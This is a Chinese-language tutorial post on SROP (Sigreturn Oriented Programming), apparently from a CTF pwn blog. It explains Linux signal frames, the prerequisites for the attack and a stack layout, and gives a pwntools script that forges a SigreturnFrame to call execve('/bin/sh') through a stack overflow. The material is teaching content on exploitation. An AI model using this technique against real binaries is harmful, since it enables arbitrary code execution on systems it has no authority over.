---
title: SROP (Sigreturn Oriented Programming)
date: 2026-01-26 09:50:42
tags: 
  - Pwn
---

### 核心原理：信号处理机制 (The Mechanism)

要理解 SROP，必须先理解 Linux 是如何处理“信号”（Signal）的。

#### 正常流程：

![](https://image.iswxl.cn/meblog/SROP%20(Sigreturn%20Oriented%20Programming)-1.png)

1. 信号触发：当系统给一个进程发送信号（如 SIGINT, SIGSEGV）时，内核会挂起当前进程。
2. 保存上下文 (Context Saving)：为了稍后能恢复进程，内核会将当前所有的寄存器状态（RIP, RSP, RBP, RAX, RDI...）打包成一个巨大的结构体（称为 Signal Frame 或 `ucontext`），并将这个结构体压入用户栈（User Stack）中。
3. 执行处理函数：内核跳转到信号处理函数（Signal Handler）。
4. 恢复上下文 (Context Restoring)：处理函数结束后，会执行一个特殊的系统调用——`sigreturn`。
5. 内核动作：内核收到 `sigreturn` 请求，它会去栈顶读取刚才保存的那个 Signal Frame，把里面的值填回对应的寄存器，从而让进程完美复原，就像没发生过中断一样。

#### 攻击原理：

SROP 的核心思想是：“伪造现场”。

内核在执行 `sigreturn` 时，不会（也很难）验证栈上的 Signal Frame 是否真的是内核之前保存的。它只是机械地从栈上读取数据并覆盖寄存器。

我们可以在栈上伪造一个 Signal Frame。在这个伪造的 Frame 里，把 `rax` 填成 59 (execve)，`rdi` 填成 "/bin/sh" 的地址，`rip` 填成 `syscall` 指令的地址。进程就会强行触发 `sigreturn` 系统调用。内核就会把我们要执行的攻击参数全部加载到寄存器中，并跳转执行。

### 攻击的前提条件

要发动 SROP，需要满足以下条件：

栈溢出漏洞：你需要足够大的溢出空间来写入伪造的 Signal Frame（在 x64 下这个结构体大约 248 字节）。
syscall 指令：程序中需要有一个 `syscall` 指令的 gadget。
控制 RAX = 15：你需要一种方法将 `rax` 寄存器设置为 15（因为 x64 下 `sys_rt_sigreturn` 的调用号是 15）。

> 如何控制 RAX = 15？
> 最常用的方法是利用 `read` 函数。`read` 函数的返回值（读入的字节数）会存放在 `rax` 中。如果我们控制 `read` 刚好读取 15 个字节，`rax` 就变成了 15。

### 攻击流程

假设我们通过栈溢出控制了程序执行流。

**栈布局 (Payload Layout):**

```text
+-------------------------+
|     Padding / Junk      |  <-- 填满缓冲区，直到覆盖 Ret Address
+-------------------------+
|   Address of Gadget     |  <-- 这里填 "pop rax; ret" (如果需要手动设15)
+-------------------------+      或者直接填 "syscall" (如果 rax 已经是15)
|         ...             |
+-------------------------+
|   Fake Signal Frame     |  <-- 这是一个巨大的结构体
| (constructed by tools)  |      包含我们想要的所有寄存器值
|   rax = 59 (execve)     |
|   rdi = ptr to /bin/sh  |
|   rip = &syscall        |  <-- 关键！恢复完上下文后，CPU下一条执行这一行
+-------------------------+

```

执行步骤：

1. 程序执行到 `syscall` 指令，此时 `rax` = 15。
2. 内核触发 `sys_rt_sigreturn`。
3. 内核从栈上读取 `Fake Signal Frame`。
4. 内核将 Frame 里的值覆盖到 CPU 寄存器：
* `rax` 变为 59
* `rdi` 变为 "/bin/sh"
* `rip` 变为指向 syscall 指令的地址

1. `sys_rt_sigreturn` 完成，返回用户态。
2. CPU 按照恢复后的 `rip` 继续执行，也就是再次执行 `syscall`。
3. 这一次 `rax` 是 59，于是执行了 `execve("/bin/sh", 0, 0)` -> Get Shell。

### 攻击脚本

`pwntools` 提供了极其方便的工具 `SigreturnFrame()` 来自动生成伪造的结构体。

假设场景：程序有一个 `start` 函数，其中执行 `read(0, stack_buf, 0x400)`，存在溢出。

```python
from pwn import *

context.arch = 'amd64'

# 假设已知地址
syscall_addr = 0x400500  # 程序中 syscall 指令的地址
binsh_addr = 0x601000    # 假设我们已经把 /bin/sh 写入了这里

# 1. 构造伪造的 Signal Frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 设置系统调用号 59
frame.rdi = binsh_addr            # 第一个参数 /bin/sh
frame.rsi = 0                     # 第二个参数 0
frame.rdx = 0                     # 第三个参数 0
frame.rip = syscall_addr          # **重点**: 恢复上下文后，下一条指令执行 syscall

# 2. 构造 Payload
# 假设 offset 是 64 字节
# 我们需要先控制 rax = 15。
# 这里假设利用 read 函数的返回值来控制 rax。
# 比如：先发送 payload，然后紧接着发送 15 字节的数据让 read 返回 15。
# 或者，如果有 pop rax; ret gadget，可以直接用。

# 这种写法是假设我们通过某种方式（如 read 15字节）已经让 rax=15，并跳转到了 syscall_addr
payload = b'A' * 64           # Padding
payload += p64(syscall_addr)  # 触发 sys_rt_sigreturn
payload += bytes(frame)       # 伪造的 Frame 数据

# 发送 payload
# p.send(payload)

```

最经典的利用场景 (Use Case: The Smallest Binary):
如果在只有 `read` 和 `syscall` 的极小二进制程序中（没有 gadgets，没有 libc），SROP 往往是唯一的解法。

1. 利用 `read` 读入 `/bin/sh` 到某个内存区。
2. 利用 `read` 读入 payload，并控制读入字节数为 15。
3. 利用 15 字节的 `read` 返回值设置 `rax=15`，随后 ret 到 `syscall`。
4. 触发 SROP get shell。
